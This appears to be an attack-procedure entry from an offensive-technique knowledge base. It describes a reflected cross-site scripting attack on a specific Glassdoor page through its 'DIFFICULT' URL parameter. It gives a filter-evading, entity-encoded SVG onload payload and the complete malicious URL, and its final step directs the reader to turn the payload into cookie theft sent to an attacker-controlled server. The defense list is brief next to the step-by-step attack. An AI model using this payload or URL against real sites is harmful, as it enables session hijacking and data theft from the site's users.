---
tags:
  - xss
  - reflected-xss
  - svg-payload
  - bypass
  - glassdoor
type: procedure
tools:
  - '[[tools/Chrome]]'
  - '[[tools/OWASP-XSS-Filter-Evasion-Cheat-Sheet]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:21.112Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 0a1b64a3-40c2-4939-8ee8-12bf5f006217
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Execute-Reflected-XSS-via-Encoded-SVG-in-DIFFICULT-Parameter

## Summary

This procedure exploits a reflected Cross-Site Scripting (XSS) vulnerability in the 'DIFFICULT' URL parameter on Glassdoor's office locations page by injecting an encoded SVG element with an onload JavaScript handler, bypassing input filters to execute arbitrary code in the victim's browser.

## Description

The vulnerability arises from insufficient sanitization of the DIFFICULT parameter, which reflects user input without proper escaping. By encoding payloads using HTML decimal entities (e.g., &#x00000000061; for 'a'), attackers can evade filters that block direct script tags or common XSS patterns. The payload leverages an SVG element's onload attribute to execute JavaScript, such as alert(1) for proof-of-concept, but can be adapted for stealing cookies, keylogging, or modifying page content. This affects any user visiting the malicious URL, potentially leading to session hijacking or phishing. The target environment is Glassdoor's web application over HTTPS, requiring no authentication.

## Requirements

1. Web browser like Chrome for testing and reproduction
2. Reference to OWASP XSS evasion techniques for payload crafting
3. Public access to https://www.glassdoor.com/Location/All-Tesla-Office-Locations-E43129.htm
4. Basic knowledge of HTML encoding and SVG attributes

## Defense

Defensive measures and detection strategies:

- Implement content security policy (CSP) to restrict inline scripts and SVG execution
- Sanitize and validate all URL parameters, decoding entities before reflection
- Use HTTP-only and secure flags on cookies to prevent theft
- Monitor for anomalous JavaScript execution or unusual alert popups in web logs

## Objectives

1. Bypass XSS filters using encoded payloads
2. Execute JavaScript in the context of the victim's session
3. Demonstrate potential for data exfiltration like cookie theft

## Instructions

### Step 1: Craft the Encoded Payload

**Context**: Use HTML decimal entities to encode the JavaScript alert function, preventing filter detection. Reference the OWASP XSS Filter Evasion Cheat Sheet for character escape sequences.

Consult [[tools/OWASP-XSS-Filter-Evasion-Cheat-Sheet]] to build the payload: > <svg onload=alert(1) </script

Encode as: %3E%3Csvg%20onload%3d%26%23x00000000061;%26%23x0000000006c%26%23x0000000065%26%23x0000000072%26%23x00000000074(1%26%230000000000000041;%20%3C%2fscript%20

This represents the decoded string that injects and executes the alert.

### Step 2: Construct and Visit the Malicious URL

**Context**: Append the encoded payload to the DIFFICULT parameter and navigate to the vulnerable page in a browser to trigger reflection and execution.

Open [[tools/Chrome]] and visit: https://www.glassdoor.com/Location/All-Tesla-Office-Locations-E43129.htm?DIFFICULT=%3E%3Csvg%20onload%3d%26%23x00000000061;%26%23x0000000006c%26%23x0000000065%26%23x0000000072%26%23x00000000074(1%26%230000000000000041;%20%3C%2fscript%20

The parameter reflects the payload, rendering the SVG and firing the onload event to execute alert(1).

> Upon successful execution, an alert box will appear, confirming the XSS. Inspect the page source to verify the injected SVG element.

### Step 3: Validate Impact

**Context**: Extend the payload if needed (e.g., replace alert(1) with document.cookie fetch) and test for data theft or modification.

Modify the payload to exfiltrate data by sending it to an attacker-controlled server, then revisit the URL to observe network requests or console output.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Chrome]]
- [[tools/OWASP-XSS-Filter-Evasion-Cheat-Sheet]]

## Tags

- xss
- reflected-xss
- svg-payload
- bypass
- glassdoor
